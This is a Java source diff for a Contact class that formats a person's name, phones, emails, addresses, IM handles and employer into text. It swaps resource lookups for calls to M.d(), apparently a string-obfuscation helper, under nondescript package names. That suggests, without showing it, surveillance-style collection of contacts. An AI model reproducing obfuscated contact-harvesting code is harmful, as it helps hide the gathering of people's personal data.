@@ -13,7 +13,7 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.ListIterator;
 
-import com.android.deviceinfo.Messages;
+import com.android.m.M;
 
 public class Contact {
 	private static final String TAG = "Contact"; //$NON-NLS-1$
@@ -92,10 +92,10 @@ public class Contact {
 	public String toString() {
 		final StringBuffer sb = new StringBuffer();
 
-		sb.append(Messages.getString("16_0") + userInfo.getUserId()); //$NON-NLS-1$
-		sb.append("\n" + Messages.getString("16_1") + userInfo.getCompleteName()); //$NON-NLS-1$
-		sb.append("\n" + Messages.getString("16_2") + userInfo.getUserNickname()); //$NON-NLS-1$
-		sb.append("\n" + Messages.getString("16_3") + userInfo.getUserNote() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+		sb.append(M.d("User Id: ") + userInfo.getUserId()); //$NON-NLS-1$
+		sb.append("\n" + M.d("Complete Name: ") + userInfo.getCompleteName()); //$NON-NLS-1$
+		sb.append("\n" + M.d("Nickname: ") + userInfo.getUserNickname()); //$NON-NLS-1$
+		sb.append("\n" + M.d("UserNote: ") + userInfo.getUserNote() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		sb.append(getInfo());
 		return sb.toString();
@@ -110,8 +110,8 @@ public class Contact {
 		while (pi.hasNext()) {
 			final PhoneInfo pinfo = pi.next();
 
-			sb.append(Messages.getString("16_5") + pinfo.getPhoneNumber()); //$NON-NLS-1$
-			sb.append("\n" + Messages.getString("16_6") + pinfo.getPhoneType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(M.d("Phone: ") + pinfo.getPhoneNumber()); //$NON-NLS-1$
+			sb.append("\n" + M.d("Phone Type: ") + pinfo.getPhoneType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		// Email Info
@@ -120,8 +120,8 @@ public class Contact {
 		while (e.hasNext()) {
 			final EmailInfo einfo = e.next();
 
-			sb.append(Messages.getString("16_8") + einfo.getEmail()); //$NON-NLS-1$
-			sb.append("\n" + Messages.getString("16_9") + einfo.getEmailType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(M.d("Email: ") + einfo.getEmail()); //$NON-NLS-1$
+			sb.append("\n" + M.d("Type: ") + einfo.getEmailType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		// Postal Address Info
@@ -130,14 +130,14 @@ public class Contact {
 		while (pa.hasNext()) {
 			final PostalAddressInfo painfo = pa.next();
 
-			sb.append(Messages.getString("16_11") + painfo.getState()); //$NON-NLS-1$
-			sb.append("\n" + Messages.getString("16_12") + painfo.getCountry()); //$NON-NLS-1$
-			sb.append("\n" + Messages.getString("16_13") + painfo.getCity()); //$NON-NLS-1$
-			sb.append("\n" + Messages.getString("16_14") + painfo.getStreet()); //$NON-NLS-1$
-			sb.append("\n" + Messages.getString("16_15") + painfo.getPoBox()); //$NON-NLS-1$
-			sb.append("\n" + Messages.getString("16_16") + painfo.getPostalCode()); //$NON-NLS-1$
-			sb.append("\n" + Messages.getString("16_17") + painfo.getNeighbor()); //$NON-NLS-1$
-			sb.append("\n" + Messages.getString("16_18") + painfo.getType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(M.d("State: ") + painfo.getState()); //$NON-NLS-1$
+			sb.append("\n" + M.d("Country: ") + painfo.getCountry()); //$NON-NLS-1$
+			sb.append("\n" + M.d("City: ") + painfo.getCity()); //$NON-NLS-1$
+			sb.append("\n" + M.d("Street: ") + painfo.getStreet()); //$NON-NLS-1$
+			sb.append("\n" + M.d("PO Box: ") + painfo.getPoBox()); //$NON-NLS-1$
+			sb.append("\n" + M.d("Zip: ") + painfo.getPostalCode()); //$NON-NLS-1$
+			sb.append("\n" + M.d("Neighbor: ") + painfo.getNeighbor()); //$NON-NLS-1$
+			sb.append("\n" + M.d("Address Type: ") + painfo.getType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		// Im Info
@@ -146,8 +146,8 @@ public class Contact {
 		while (im.hasNext()) {
 			final ImInfo iminfo = im.next();
 
-			sb.append(Messages.getString("16_20") + iminfo.getIm()); //$NON-NLS-1$
-			sb.append("\n" + Messages.getString("16_21") + iminfo.getImType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(M.d("IM: ") + iminfo.getIm()); //$NON-NLS-1$
+			sb.append("\n" + M.d("IM Type: ") + iminfo.getImType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		// Organization Info
@@ -156,9 +156,9 @@ public class Contact {
 		while (o.hasNext()) {
 			final OrganizationInfo oinfo = o.next();
 
-			sb.append(Messages.getString("16_23") + oinfo.getCompanyName()); //$NON-NLS-1$
-			sb.append("\n" + Messages.getString("16_24") + oinfo.getCompanyTitle()); //$NON-NLS-1$
-			sb.append("\n" + Messages.getString("16_25") + oinfo.getType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(M.d("Company Name: ") + oinfo.getCompanyName()); //$NON-NLS-1$
+			sb.append("\n" + M.d("Company Title: ") + oinfo.getCompanyTitle()); //$NON-NLS-1$
+			sb.append("\n" + M.d("Company Type: ") + oinfo.getType() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		// Website Info
@@ -167,7 +167,7 @@ public class Contact {
 		while (w.hasNext()) {
 			final WebsiteInfo winfo = w.next();
 
-			sb.append(Messages.getString("16_27") + winfo.getWebsiteName() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(M.d("Website: ") + winfo.getWebsiteName() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		return sb.toString();
